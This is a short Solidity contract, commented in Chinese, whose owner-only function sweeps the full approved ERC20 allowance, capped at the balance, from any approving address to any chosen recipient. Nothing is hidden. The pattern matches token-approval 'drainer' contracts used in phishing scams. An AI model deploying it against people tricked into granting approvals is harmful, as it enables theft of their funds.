// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function allowance(address owner, address spender) external view returns (uint256);

    function transferFrom(address from, address to, uint256 amount) external returns (bool);

    function balanceOf(address account) external view returns (uint256);
}

contract AuthorizedTransfer {
    address public owner;

    modifier onlyOwner() {
        require(msg.sender == owner, "Not contract owner");
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    /// @notice 将授权给本合约地址的ERC20代币从 `from` 地址转移到 `to` 地址
    /// @param token ERC20 代币地址
    /// @param from 授权人地址（B）
    /// @param to 接收人地址（A）
    function transferFromAuthorized(address token, address from, address to) external onlyOwner {
        uint256 allowanceAmount = IERC20(token).allowance(from, address(this));
        uint256 balance = IERC20(token).balanceOf(from);
        uint256 amount = allowanceAmount < balance ? allowanceAmount : balance;
        require(amount > 0, "No allowance or balance to transfer");

        bool success = IERC20(token).transferFrom(from, to, amount);
        require(success, "Transfer failed");
    }
}
